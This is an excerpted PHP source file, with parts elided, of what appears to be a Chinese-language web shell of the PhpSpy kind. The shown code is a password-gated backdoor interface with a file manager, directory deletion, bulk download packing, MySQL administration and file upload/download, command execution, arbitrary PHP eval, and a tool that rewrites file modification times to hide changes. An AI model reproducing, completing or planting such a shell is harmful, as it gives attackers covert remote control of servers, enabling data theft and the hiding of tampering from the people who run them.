...
if ($action == "logout") {
	...
	p('<a style="font:12px Verdana" href="'.$self.'">88</a>');
	exit;
}
if($admin['check']) {
	if ($doing == 'login') {
		if ($admin['pass'] == $password) {
			...
			p('<meta http-equiv="refresh" content="1;URL='.$self.'">');
			p('<a style="font:12px Verdana" href="'.$self.'">欢迎</a>');
			exit;
		}
	}
...
<table width="100%" border="0" cellpadding="0" cellspacing="0">
	...
	<tr class="alt1">
		<td><span style="float:right;">安全模式:<?php echo getcfg('safe_mode');?></span>
			<a href="javascript:goaction('logout');">注销</a> | 
			<a href="javascript:goaction('file');">文件管理器</a> | 
			<a href="javascript:goaction('sqladmin');">MySQL 管理模式r</a> | 
			<a href="javascript:goaction('sqlfile');">MySQL 上传与下载</a> | 
			<a href="javascript:goaction('shell');">执行命令</a> | 
			<a href="javascript:goaction('phpenv');">PHP 变量</a> | 
			<a href="javascript:goaction('eval');">评价PHP代码</a>
...
function godir(dir,view_writable){
  ...
  <?php
	...
	if ($view_writable) {
		...
		p(' | <a href="javascript:godir(\''.$nowpath.'\',\'1\');">浏览写入</a>');
	}
	...
	p('<tr class="head"><td>&nbsp;</td><td>文件名</td><td width="16%">最后修改</td><td width="10%">文件大小</td><td width="20%">属性 / Perms</td><td width="22%">行动</td></tr>');
	...
	foreach($dirdata as $key => $dirdb){
		if($dirdb['filename']!='..' && $dirdb['filename']!='.') {
			...
			p('<td nowrap><a href="javascript:dofile(\'deldir\',\''.$dirdb['server_link'].'\',\'确定删除？'.$dirdb['filename'].'? \\n\\n如果不是空目录，将删除全部内容.\')">删除</a> | <a href="javascript:Rename(\''.$dirdb['server_link'].'\');">重命名</a></td>');
			p('</tr>');
			$dir_i++;
		} else {
			if($dirdb['filename']=='..') {
	...
	p('<tr class="'.bg().'"><td align="center"><input name="chkall" value="on" type="checkbox" onclick="CheckAll(this.form)" /></td><td><a href="javascript:dofile(\'downrar\');">包装下载选定</a> - <a href="javascript:dofile(\'delfiles\');">删除所选</a></td><td colspan="4" align="right">'.$dir_i.' directories / '.$file_i.' files</td></tr>');
	p('</form></table>');
}// end dir
...
<?php
	...
	p('<p>保存路径(fullpath): <input class="input" name="savepath" size="45" type="text" /> 选择文件: <input class="input" name="uploadfile" type="file" /> <a href="javascript:mysqlfile(\'mysqlupload\');">上传</a></p>');
	p('<h2>Download file</h2>');
	p('<p>文件: <input class="input" name="mysqldlfile" size="115" type="text" /> <a href="javascript:mysqlfile(\'mysqldown\');">下载</a></p>');
	makehide('dbhost');
	makehide('dbport');
	makehide('dbuser');
	makehide('dbpass');
...
elseif ($action == 'newtime') {
	...
	makehide('action','file');
	makehide('dir',$nowpath);
	makeinput(array('title'=>'改变文件','name'=>'curfile','value'=>$opfile,'size'=>120,'newline'=>1));
	makeinput(array('title'=>'参考文件 (fullpath)','name'=>'tarfile','size'=>120,'newline'=>1));
	formfooter();
	...
	p('<p>Instead &raquo;');
	p('year:');
	makeinput(array('name'=>'年','value'=>date('Y',$opfilemtime),'size'=>4));
	p('month:');
	makeinput(array('name'=>'月','value'=>date('m',$opfilemtime),'size'=>2));
	p('day:');
	makeinput(array('name'=>'日','value'=>date('d',$opfilemtime),'size'=>2));
	p('hour:');
	makeinput(array('name'=>'小时','value'=>date('H',$opfilemtime),'size'=>2));
	p('minute:');
	makeinput(array('name'=>'分','value'=>date('i',$opfilemtime),'size'=>2));
	p('second:');
	makeinput(array('name'=>'秒','value'=>date('s',$opfilemtime),'size'=>2));
	p('</p>');
	formfooter();
}//end newtime
...
elseif ($action == 'shell') {
	if (IS_WIN && IS_COM) {
		...
		makeinput(array('title'=>'计划','name'=>'program','value'=>$program,'newline'=>1));
		p('<p>');
		makeinput(array('title'=>'参数','name'=>'parameter','value'=>$parameter));
...
?>
	...
	<span style="font:11px Verdana;">密码: </span><input name="password" type="password" size="20">
